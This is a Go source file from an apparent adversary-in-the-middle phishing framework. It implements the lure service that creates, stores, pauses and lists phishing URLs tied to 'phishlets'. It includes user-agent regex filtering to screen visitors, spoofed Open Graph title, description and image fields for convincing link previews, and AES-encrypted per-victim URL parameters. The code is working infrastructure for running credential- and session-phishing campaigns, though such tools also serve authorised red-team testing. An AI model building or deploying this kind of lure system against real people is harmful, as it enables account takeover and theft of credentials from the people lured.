package aitm

import (
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"regexp"
	"strings"
	"time"

	"github.com/google/uuid"
)

// lureStore is the persistence interface required by LureService.
type lureStore interface {
	CreateLure(lure *Lure) error
	GetLure(id string) (*Lure, error)
	UpdateLure(lure *Lure) error
	DeleteLure(id string) error
	ListLures() ([]*Lure, error)
}

// Lure is a configured phishing URL instance tied to a specific phishlet.
type Lure struct {
	ID          string
	Phishlet    string
	Hostname    string
	Path        string
	RedirectURL string
	SpoofURL    string
	UAFilter    string // raw regex; empty means accept all
	uaFilter    *regexp.Regexp
	PausedUntil time.Time
	OGTitle     string
	OGDesc      string
	OGImage     string
	OGURL       string
	Redirector  string
	ParamsKey   []byte // 32-byte AES-256-GCM key, generated at creation
}

func (l *Lure) IsPaused() bool {
	return !l.PausedUntil.IsZero() && time.Now().Before(l.PausedUntil)
}

// PausedUntilPtr returns a pointer to PausedUntil, or nil if not paused.
func (l *Lure) PausedUntilPtr() *time.Time {
	if l.PausedUntil.IsZero() {
		return nil
	}
	return &l.PausedUntil
}

func (l *Lure) MatchesUA(ua string) bool {
	if l.uaFilter == nil {
		return true
	}
	return l.uaFilter.MatchString(ua)
}

// CompileUA compiles the UAFilter regex. Must be called after loading from storage.
func (l *Lure) CompileUA() error {
	if l.UAFilter == "" {
		l.uaFilter = nil
		return nil
	}
	compiled, err := regexp.Compile(l.UAFilter)
	if err != nil {
		return err
	}
	l.uaFilter = compiled
	return nil
}

// URL returns the base phishing URL for this lure.
func (l *Lure) URL(httpsPort int) string {
	host := l.Hostname
	if httpsPort != 0 && httpsPort != 443 {
		host = fmt.Sprintf("%s:%d", host, httpsPort)
	}
	return "https://" + host + l.Path
}

// lureInvalidator is called after any lure mutation to refresh caches.
type lureInvalidator interface {
	InvalidateLures()
}

// paramCipher provides authenticated encryption for lure URL parameters.
type paramCipher interface {
	Encrypt(key, plaintext []byte) ([]byte, error)
	Decrypt(key, ciphertext []byte) ([]byte, error)
}

// LureService owns all business logic for lure management.
type LureService struct {
	Store       lureStore
	Invalidator lureInvalidator
	Cipher      paramCipher
}

func (s *LureService) Create(lure *Lure) error {
	lure.ID = uuid.New().String()

	key := make([]byte, 32)
	if _, err := rand.Read(key); err != nil {
		return err
	}
	lure.ParamsKey = key
	if err := s.Store.CreateLure(lure); err != nil {
		return err
	}
	s.Invalidator.InvalidateLures()
	return nil
}

func (s *LureService) Get(id string) (*Lure, error) {
	return s.Store.GetLure(id)
}

func (s *LureService) Update(lure *Lure) error {
	if err := s.Store.UpdateLure(lure); err != nil {
		return err
	}
	s.Invalidator.InvalidateLures()
	return nil
}

func (s *LureService) Delete(id string) error {
	if err := s.Store.DeleteLure(id); err != nil {
		return err
	}
	s.Invalidator.InvalidateLures()
	return nil
}

func (s *LureService) List() ([]*Lure, error) {
	return s.Store.ListLures()
}

func (s *LureService) Pause(id string, d time.Duration) (*Lure, error) {
	lure, err := s.Store.GetLure(id)
	if err != nil {
		return nil, err
	}
	lure.PausedUntil = time.Now().Add(d)
	if err := s.Store.UpdateLure(lure); err != nil {
		return nil, err
	}
	s.Invalidator.InvalidateLures()
	return lure, nil
}

func (s *LureService) Unpause(id string) (*Lure, error) {
	lure, err := s.Store.GetLure(id)
	if err != nil {
		return nil, err
	}
	lure.PausedUntil = time.Time{}
	if err := s.Store.UpdateLure(lure); err != nil {
		return nil, err
	}
	s.Invalidator.InvalidateLures()
	return lure, nil
}

// URLWithParams returns the phishing URL with encrypted custom parameters
// embedded as a base64url ?p= query value.
func (s *LureService) URLWithParams(lure *Lure, httpsPort int, params map[string]string) (string, error) {
	base := lure.URL(httpsPort)
	if len(params) == 0 || len(lure.ParamsKey) == 0 {
		return base, nil
	}
	var sb strings.Builder
	for paramName, value := range params {
		sb.WriteString(paramName + "=" + value + "\n")
	}
	ct, err := s.Cipher.Encrypt(lure.ParamsKey, []byte(sb.String()))
	if err != nil {
		return "", err
	}
	return base + "?p=" + base64.RawURLEncoding.EncodeToString(ct), nil
}

// DecryptParams decodes and decrypts the ?p= query value from a lure URL.
func (s *LureService) DecryptParams(lure *Lure, token string) (map[string]string, error) {
	if len(lure.ParamsKey) == 0 || token == "" {
		return map[string]string{}, nil
	}
	ct, err := base64.RawURLEncoding.DecodeString(token)
	if err != nil {
		return nil, err
	}
	plain, err := s.Cipher.Decrypt(lure.ParamsKey, ct)
	if err != nil {
		return nil, err
	}
	out := make(map[string]string)
	for line := range strings.SplitSeq(string(plain), "\n") {
		paramName, val, ok := strings.Cut(line, "=")
		if ok {
			out[paramName] = val
		}
	}
	return out, nil
}
